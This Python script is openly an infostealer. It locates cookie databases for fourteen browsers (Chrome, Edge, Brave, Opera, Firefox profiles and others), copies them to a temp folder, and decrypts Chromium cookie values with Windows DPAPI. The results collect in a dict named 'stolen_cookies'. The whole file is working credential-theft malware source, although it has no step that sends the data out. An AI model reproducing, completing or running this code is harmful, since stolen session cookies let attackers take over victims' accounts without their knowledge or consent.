import os
import sqlite3
from pathlib import Path
import win32crypt
import glob

username = os.getenv("USERNAME")
browser_paths = {
    "brave": os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
    "chrome": os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
    "chromium": os.path.join(os.getenv("localappdata"), "Chromium", "User Data", "Default", "Network", "Cookies"),
    "comodo": os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data", "Default", "Network", "Cookies"),
    "edge": os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
    "epicprivacy": os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data", "Default", "Network", "Cookies"),
    "iridium": os.path.join(os.getenv("localappdata"), "Iridium", "User Data", "Default", "Network", "Cookies"),
    "opera": os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable", "Network", "Cookies"),
    "opera_gx": os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable", "Network", "Cookies"),
    "slimjet": os.path.join(os.getenv("localappdata"), "Slimjet", "User Data", "Default", "Network", "Cookies"),
    "ur": os.path.join(os.getenv("localappdata"), "UR Browser", "User Data", "Default", "Network", "Cookies"),
    "vivaldi": os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data", "Default", "Network", "Cookies"),
    "yandex": os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data", "Default", "Network", "Cookies"),
    "firefox": f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
}

stolen_cookies = {}

def find_firefox_profiles(firefox_base_path):
    cookie_files = []
    if os.path.exists(firefox_base_path):
        for profile in glob.glob(os.path.join(firefox_base_path, "*")):
            cookie_path = os.path.join(profile, "cookies.sqlite")
            if os.path.exists(cookie_path):
                cookie_files.append(cookie_path)
    return cookie_files

def debug_path(cookie_path):
    if not os.path.exists(cookie_path):
        return False
    if not os.access(cookie_path, os.R_OK):
        return False
    return True

def steal_cookies(browser, cookie_path):
    try:
        if not debug_path(cookie_path):
            return []
        temp_path = os.path.join(os.getenv("TEMP"), f"{browser}_cookies_temp")
        with open(cookie_path, 'rb') as src, open(temp_path, 'wb') as dst:
            dst.write(src.read())
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        if browser == "firefox":
            cursor.execute("SELECT host, name, value, path, expiry FROM moz_cookies")
        else:
            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
        cookies = []
        for row in cursor.fetchall():
            if browser == "firefox":
                cookie = {
                    "domain": row[0],
                    "name": row[1],
                    "value": row[2],
                    "path": row[3],
                    "expires": row[4]
                }
            else:
                try:
                    decrypted_value = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1].decode('utf-8')
                except:
                    decrypted_value = row[2].decode('utf-8', errors='ignore')
                cookie = {
                    "domain": row[0],
                    "name": row[1],
                    "value": decrypted_value,
                    "path": row[3],
                    "expires": row[4]
                }
            cookies.append(cookie)
        conn.close()
        os.remove(temp_path)
        return cookies
    except Exception:
        return []

for browser, path in browser_paths.items():
    if browser == "firefox":
        firefox_cookie_files = find_firefox_profiles(path)
        for i, cookie_file in enumerate(firefox_cookie_files):
            profile_name = f"firefox_profile_{i+1}"
            stolen_cookies[profile_name] = steal_cookies("firefox", cookie_file)
    else:
        stolen_cookies[browser] = steal_cookies(browser, path)